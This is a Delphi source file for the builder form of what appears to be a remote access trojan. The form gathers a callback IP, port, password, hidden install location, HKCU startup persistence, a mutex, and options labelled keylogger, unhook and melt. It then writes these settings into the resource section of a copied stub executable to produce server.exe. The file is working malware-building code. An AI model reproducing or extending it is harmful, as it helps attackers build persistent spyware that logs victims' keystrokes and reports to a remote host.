unit uBuild;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, PngBitBtn, ActiveX, ExtCtrls,
  pngimage,inifiles;

type
  TForm9 = class(TForm)
    pgc1: TPageControl;
    ts1: TTabSheet;
    ts2: TTabSheet;
    ts3: TTabSheet;
    redt1: TRichEdit;
    btn1: TButton;
    lbl1: TLabel;
    edt1: TEdit;
    lbl2: TLabel;
    edt2: TEdit;
    lbl3: TLabel;
    edt3: TEdit;
    grp1: TGroupBox;
    chk1: TCheckBox;
    lbl4: TLabel;
    lbl5: TLabel;
    cbb1: TComboBox;
    edt4: TEdit;
    grp2: TGroupBox;
    chk2: TCheckBox;
    chk3: TCheckBox;
    chk4: TCheckBox;
    edt5: TEdit;
    grp3: TGroupBox;
    chk5: TCheckBox;
    edt6: TEdit;
    lbl6: TLabel;
    shp1: TShape;
    img1: TImage;
    lbl7: TLabel;
    shp2: TShape;
    lbl8: TLabel;
    chk6: TCheckBox;
    chk7: TCheckBox;
    procedure FormCreate(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure edt2Exit(Sender: TObject);
    procedure edt2KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure edt1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure edt1Exit(Sender: TObject);
    procedure chk1Click(Sender: TObject);
    procedure chk2Click(Sender: TObject);
    procedure edt5Exit(Sender: TObject);
    procedure edt5KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure cbb1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure cbb1Exit(Sender: TObject);
    procedure edt4Exit(Sender: TObject);
    procedure edt4KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure edt6Exit(Sender: TObject);
    procedure edt6KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure chk6Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form9: TForm9;

implementation

{$R *.dfm}

function IsInteger(s: string): boolean;
var i, e: integer;
begin
  Val(s, i, e);
  result := e = 0;
end;
//By CalganX
function SimpleCryptString(const S, Key: string): string;
var
  i, j: Integer;
  C: Byte;
  P: PByte;
begin
  SetLength(Result, Length(S));
  P := PByte(Result);

  j := 1;
  for i := 1 to Length(S) do
  begin
    C := Ord(S[i]);

    C := C xor Ord(Key[j]);
    P^ := C;
    Inc(P);
    Inc(j);
    if j > Length(Key) then
      j := 1;
  end;
end;

function CheckInput:Boolean;
begin
  result := True;
  if (form9.edt1.Text = '') then begin
    result := false;
    MessageBox(Form9.Handle,PChar('Type in a valid IP!'),pchar('Error!'),0);
    Form9.pgc1.TabIndex := 0;
    Form9.edt1.SetFocus;
    Form9.edt1.Color := clRed;
    Exit;
  end;

  if (form9.edt2.Text = '') or (IsInteger(form9.edt2.Text) = false) then begin
    result := false;
    MessageBox(Form9.Handle,PChar('Type in a valid Port!'),pchar('Error!'),0);
    Form9.pgc1.TabIndex := 0;
    Form9.edt2.SetFocus;
    Form9.edt2.Color := clRed;
    Exit;
  end;

  if (Form9.chk1.Checked = true) and (Form9.cbb1.Text = '') then begin
    result := false;
    MessageBox(Form9.Handle,PChar('Type in a valid Installation Directory!'),pchar('Error!'),0);
    Form9.pgc1.TabIndex := 1;
    Form9.cbb1.SetFocus;
    Form9.cbb1.Color := clRed;
    Exit;
  end;

  if (Form9.chk1.Checked = true) and (Form9.edt4.Text = '') then begin
    result := false;
    MessageBox(Form9.Handle,PChar('Type in a valid Installationfilename!'),pchar('Error!'),0);
    Form9.pgc1.TabIndex := 1;
    Form9.edt4.SetFocus;
    Form9.edt4.Color := clRed;
    Exit;
  end;

  if (Form9.chk1.Checked = true) and (Copy(Form9.edt4.Text,Length(Form9.edt4.Text) -3,4) <> '.exe') then begin
    Form9.edt4.Text := Form9.edt4.Text + '.exe';
  end;

  if (Form9.chk4.Checked = true) and (Form9.edt5.Text = '') then begin
    result := false;
    MessageBox(Form9.Handle,PChar('Type in a valid HKCU Startupname!'),pchar('Error!'),0);
    Form9.pgc1.TabIndex := 1;
    Form9.edt5.SetFocus;
    Form9.edt5.Color := clRed;
    Exit;
  end;

  if (Form9.edt6.Text = '') then begin
    result := false;
    MessageBox(Form9.Handle,PChar('Type in a valid Mutexname!'),pchar('Error!'),0);
    Form9.pgc1.TabIndex := 1;
    Form9.edt6.SetFocus;
    Form9.edt6.Color := clRed;
    Exit;
  end;
end;

function CheckboxtoString(cChk: TCheckBox):string;
begin
  if cChk.Checked then begin
    Result := '1';
  end else begin
    Result := '0';
  end;
end;

procedure TForm9.FormCreate(Sender: TObject);
begin
redt1.Text := '';
cbb1.AddItem('Application Data',nil);
cbb1.AddItem('Windows',nil);
cbb1.AddItem('System32',nil);
cbb1.AddItem('Temp',nil);
end;

//thanks to Wack-a-mole
function WriteSettings(Filename: PChar; Settings: string): Boolean;
var
  hResource: THandle;
begin
  Result := False;
  hResource := BeginUpdateResource(Filename, False);
  if hResource <> 0 then
  begin
    if UpdateResource(hResource, RT_RCDATA, 'CFG', 0, pchar(Settings), Length(Settings)) then
      Result := True;
    EndUpdateResource(hResource, False);  
  end;
end;

function CreateGuid: string;
var
  ID: TGUID;
begin
  Result := '';
  if CoCreateGuid(ID) = S_OK then Result := GUIDToString(ID);
end;

procedure TForm9.btn1Click(Sender: TObject);
var
  sString:string;
  ini:TIniFile;
begin
redt1.Text := '[' + TimeToStr(Time) + '] Checking Inputs...';
if CheckInput then begin
  redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Inputs ok!';
end else begin
  redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Input(s) wrong! Canceling Process...';
  Exit;
end;
redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Collecting Inputs...';
//          IP                Port              Password            Installpath         Filename            Startupname
sString := edt1.Text + '##' + edt2.Text + '##' + edt3.Text + '##' + cbb1.Text + '##' + edt4.Text + '##' + edt5.Text + '##' + CreateGuid + '##';
//
sString := sString + CheckboxtoString(chk1) + '##' + CheckboxtoString(chk2) + '##' + CheckboxtoString(chk3) + '##' + CheckboxtoString(chk4) + '##' + edt6.Text + '##' + CheckboxtoString(chk5) + '##' + CheckboxtoString(chk7) + '##' + CheckboxtoString(chk6) + '##' ;

redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Inputs collected!';
redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Encrypting Strings...';
//sString := SimpleCryptString(sString,'Slayer616');
redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Strings encrypted!';
if FileExists(GetCurrentDir + '\stub\stub.exe') = false then begin
  redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Stub.exe not found! Canceling Process..';
  Exit;
end;
if FileExists(GetCurrentDir + '\server.exe') then begin
  redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Existing Server.exe found!';
  if DeleteFile(GetCurrentDir + '\server.exe') then begin
    redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Existing Server.exe deleted!';
  end else begin
    redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Can''t delete existing Server.exe! Canceling Proces...';
    Exit;
  end;
end;
if CopyFile(PChar(GetCurrentDir + '\stub\stub.exe'),PChar(GetCurrentDir + '\server.exe'), false) = false then begin
  redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Can''t copy Stub.exe to Server.exe! Canceling Process...';
  Exit;
end else begin
  redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Copied Stub.exe to Server.exe sucessfully!';
end;
if WriteSettings(PChar(GetCurrentDir + '\server.exe'),sString) = true then begin
  redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Settings written to Server.exe sucessfully!';
end else begin
  redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Can''t write settings to Server.exe! Canceling Process...';
  Exit;
end;
redt1.Text := redt1.Text + #13 + '[' + TimeToStr(Time) + '] Completed!';
try
    Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Settings.ini');
    Ini.WriteString('Builder', 'IP', edt1.Text);
    Ini.WriteString('Builder', 'Port', edt2.Text);
    Ini.WriteString('Builder', 'Password', edt3.Text);
    Ini.WriteString('Builder', 'Filename', edt4.Text);
    Ini.WriteString('Builder', 'Startupname', edt5.Text);
    Ini.WriteString('Builder', 'Mutex', edt6.Text);
    Ini.WriteBool('Builder', 'Install?', chk1.Checked);
    Ini.WriteBool('Builder', 'Startup?', chk2.Checked);
    Ini.WriteBool('Builder', 'ActiveX?', chk3.Checked);
    Ini.WriteBool('Builder', 'HKCU?', chk4.Checked);
    Ini.WriteBool('Builder', 'Unhook?', chk5.Checked);
    Ini.WriteBool('Builder', 'Keylogger?', chk6.Checked);
    Ini.WriteBool('Builder', 'Melt?', chk7.Checked);
  finally
    Ini.Free;
  end;
end;

procedure TForm9.edt2Exit(Sender: TObject);
begin
edt2.Color := clWindow;
end;

procedure TForm9.edt2KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
Form9.edt2.Color := clWindow;
end;

procedure TForm9.edt1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
edt1.Color := clWindow;
end;

procedure TForm9.edt1Exit(Sender: TObject);
begin
edt1.Color := clWindow;
end;

procedure TForm9.chk1Click(Sender: TObject);
begin
if chk1.Checked then begin
  lbl4.Enabled := True;
  lbl5.Enabled := True;
  cbb1.Enabled := True;
  edt4.Enabled := True;
  chk7.Enabled := true;
end else begin
  lbl4.Enabled := False;
  lbl5.Enabled := False;
  cbb1.Enabled := False;
  edt4.Enabled := False;
  chk7.Enabled := False;
end;
end;

procedure TForm9.chk2Click(Sender: TObject);
begin
if chk2.Checked then begin
  chk3.Enabled := True;
  chk4.Enabled := True;
  edt5.Enabled := True;
end else begin
  chk3.Enabled := False;
  chk4.Enabled := False;
  edt5.Enabled := False;
end;
end;

procedure TForm9.edt5Exit(Sender: TObject);
begin
edt5.Color := clWindow;
end;

procedure TForm9.edt5KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
edt5.Color := clWindow;
end;

procedure TForm9.cbb1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
cbb1.Color := clWindow;
end;

procedure TForm9.cbb1Exit(Sender: TObject);
begin
cbb1.Color := clWindow;
end;

procedure TForm9.edt4Exit(Sender: TObject);
begin
edt4.Color := clWindow;
end;

procedure TForm9.edt4KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
edt4.Color := clWindow;
end;

procedure TForm9.edt6Exit(Sender: TObject);
begin
edt6.Color := clWindow;
end;

procedure TForm9.edt6KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
edt6.Color := clWindow;
end;

procedure TForm9.chk6Click(Sender: TObject);
begin
if chk6.Checked then
MessageBox(form9.Handle,PChar('This Option could make the Server unstable!'),PChar('Warning!'),0);
end;

procedure TForm9.FormShow(Sender: TObject);
begin
if chk1.Checked then begin
  lbl4.Enabled := True;
  lbl5.Enabled := True;
  cbb1.Enabled := True;
  edt4.Enabled := True;
  chk7.Enabled := true;
end else begin
  lbl4.Enabled := False;
  lbl5.Enabled := False;
  cbb1.Enabled := False;
  edt4.Enabled := False;
  chk7.Enabled := False;
end;
if chk2.Checked then begin
  chk3.Enabled := True;
  chk4.Enabled := True;
  edt5.Enabled := True;

end else begin
  chk3.Enabled := False;
  chk4.Enabled := False;
  edt5.Enabled := False;
end;
end;

end.
